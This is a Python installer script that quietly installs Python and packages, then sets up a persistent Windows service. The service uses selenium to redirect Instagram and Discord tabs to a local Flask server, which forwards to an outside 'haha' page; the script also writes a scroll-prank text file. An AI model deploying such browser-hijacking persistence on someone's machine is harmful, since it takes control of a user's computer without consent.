import os
import subprocess
import sys

def install_python():
    # Download and install Python from python.org
    python_installer = 'python-3.11.2-amd64.exe'
    python_url = f'https://www.python.org/ftp/python/3.11.2/{python_installer}'
    subprocess.check_call(['powershell', '-Command', f"Invoke-WebRequest -Uri {python_url} -OutFile {python_installer}"])
    subprocess.check_call([python_installer, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'])
    os.remove(python_installer)

def install_packages():
    packages = ['selenium', 'flask', 'pywin32', 'webdriver-manager']
    for package in packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def setup_files():
    if not os.path.exists('HaveFunScrolling.txt'):
        with open('HaveFunScrolling.txt', 'w') as f:
            lines = ["Have fun scrolling!\n"] * 499
            lines.append("https://docs.google.com/document/d/1zN4IyoDTEbQ4R0eBg6FVevuUsrTSxMnooUovIV6skqQ/edit\n")
            lines.extend(["Have fun scrolling!\n"] * 500)
            f.writelines(lines)

    if not os.path.exists('server.py'):
        with open('server.py', 'w') as f:
            f.write("""\
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return redirect("https://nkevi.com/haha", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
""")

    if not os.path.exists('monitor_redirect.py'):
        with open('monitor_redirect.py', 'w') as f:
            f.write("""\
import time
import logging
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# Configure logging
logging.basicConfig(level=logging.INFO)

# URLs to redirect
urls_to_redirect = ["https://www.instagram.com", "https://discord.com"]

# Set up Chrome options
chrome_options = Options()
chrome_options.add_argument("--disable-notifications")

# Initialize WebDriver
driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)

try:
    while True:
        for handle in driver.window_handles:
            driver.switch_to.window(handle)
            current_url = driver.current_url
            for url in urls_to_redirect:
                if url in current_url:
                    logging.info(f"Redirecting {current_url} to http://localhost:5000")
                    driver.get('http://localhost:5000')
        time.sleep(5)  # Check every 5 seconds
finally:
    driver.quit()
""")

    if not os.path.exists('myservice.py'):
        with open('myservice.py', 'w') as f:
            f.write("""\
import win32serviceutil
import win32service
import win32event
import servicemanager
import subprocess

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "URLRedirectService"
    _svc_display_name_ = "URL Redirect Service"
    _svc_description_ = "Redirects specific URLs to a custom page"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.process = None

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        if self.process:
            self.process.terminate()
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        self.process = subprocess.Popen(['python', 'monitor_redirect.py'], creationflags=subprocess.CREATE_NEW_CONSOLE)
        self.process.wait()

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(MyService)
""")

def create_service():
    subprocess.check_call([sys.executable, 'myservice.py', 'install'])
    subprocess.check_call([sys.executable, 'myservice.py', 'start'])

if __name__ == '__main__':
    install_python()
    install_packages()
    setup_files()
    create_service()
    print("Setup complete. The server and URL monitor should now be running as a service.")
